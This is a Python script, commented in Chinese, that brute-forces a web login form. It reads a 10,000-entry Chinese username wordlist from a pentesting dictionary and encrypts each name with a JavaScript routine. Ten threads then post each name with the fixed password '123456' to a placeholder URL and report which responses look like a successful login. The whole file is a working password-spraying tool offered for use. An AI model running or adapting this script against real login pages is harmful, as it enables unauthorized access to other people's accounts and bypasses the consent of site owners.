import time
import execjs
import requests
from queue import Queue
from threading import Thread, Lock

class CocosSpiderThread:
    """
    基于requests和threading实现多线程爬虫：
    实现多线程爆破登录框
    """

    def __init__(self):
        self.url = "XXXXX"  # url地址
        self.q = Queue()  # 创建队列
        self.lock = Lock()  # 创建线程锁
        self.jscode = execjs.compile(open('code.js').read())

    def dict_in(self):
        """
        function:  字典入队列函数
              in:  None
             out:  None
          return:  int >0 ok, <0 some wrong
          others:  url Queue Func
        """
        with open(r"D:\program\tools\爆目录\字典相关\Dictionary-Of-Pentesting-master\Username\name_top10000_CN.txt") as f:
            for line in f.readlines():
                name = line.strip()
                self.q.put(name)
            f.close()

    def pares_html(self):
        """
        function:  线程的事件函数：获取url，请求，解析，处理数据
              in:  None
             out:  None
          return:  int >0 ok, <0 some wrong
          others:  The Event Function Of The Thread
        """
        while True:
            self.lock.acquire()  # 上锁
            if not self.q.empty():  # 判断队列是否为空
                name = self.q.get()  # 出队列
                self.lock.release()  # 释放锁
                headers = {}
                # 请求头
                username = self.jscode.call('function', name)
                data = {
                    'username': username,
                    'password': '123456'
                }

                html = requests.post(url=self.url, headers=headers, data=data).text
                # 获取响应内容
                if 'xxx' in html:
                    print("**********{}".format(name))
                else:
                    print("not{}".format(name))

            else:  # 当队列为空时，已经上锁未释放，所以需要释放锁
                self.lock.release()  # 释放锁
                break

    def run(self):
        """
        function:  程序入口函数
              in:  None
             out:  None
          return:  None
          others:  Program Entry Func
        """
        self.dict_in()  # 先让url地址入队列
        t_list = []  # 创建多线程
        for i in range(10):  # 创建10个线程
            t = Thread(target=self.pares_html)  # 线程实例化
            t_list.append(t)
            t.start()  # 线程开启
        for t in t_list:
            t.join()  # 线程同步


if __name__ == '__main__':
    start_time = time.time()  # 记录开始时间
    spider = CocosSpiderThread()
    spider.run()
    end_time = time.time()  # 记录结束时间
    print("time:%.2fs" % (end_time - start_time))  # 打印总用时
